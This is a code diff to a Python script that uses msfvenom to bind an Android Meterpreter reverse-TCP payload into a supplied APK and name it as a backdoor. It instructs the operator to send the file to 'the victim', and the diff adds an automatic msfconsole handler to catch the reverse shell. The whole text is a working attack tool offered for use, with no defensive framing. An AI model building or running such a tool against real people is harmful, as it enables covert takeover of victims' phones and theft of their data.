@@ -18,12 +18,17 @@ try:
 	additional = input(Back.BLUE + Fore.WHITE + "[OPTIONAL] Enter additional msfvenom arguments (empty by default) "+Style.RESET_ALL)
 	command = "msfvenom -x "+apkFile+" -p android/meterpreter/reverse_tcp -o rename_this_backdoor.apk LHOST="+ip+" LPORT="+port + " " + additional
 	os.system(command)
-	print(Fore.RED+Back.WHITE+Style.BRIGHT+"\n\n Send the apk file to the victim then start msfconsole session and run the following commands: \n")
+	print(Fore.RED+Back.WHITE+Style.BRIGHT+"\n\nSend the apk file to the victim \n\nTo run msfconsole manually: then start msfconsole session and run the following commands: \n")
 	print(Fore.MAGENTA+"\n"+"          use exploit/multi/handler")
 	print("          set payload android/meterpreter/reverse_tcp")
 	print("          set LHOST "+ip)
 	print("          set LPORT "+port)
 	print("          exploit \n"+Style.RESET_ALL)
+	
+	print(Back.RED+Fore.WHITE+Style.BRIGHT+"\n\n... STARTING METASPLOIT, LISTENING ON PORT: "+port+Style.RESET_ALL)
+	
+	os.system("msfconsole -q -x \"use exploit/multi/handler;set payload android/meterpreter/reverse_tcp;set LHOST "+ip+"; set LPORT "+port+";exploit;\"")
+
 except:
 	print(Back.RED + "SOMETHING WENT WRONG! PLEASE CHECK YOUR ARGUNETS OR MAKE SURE THE APK FILE LOCATION IS CORRECT")
 
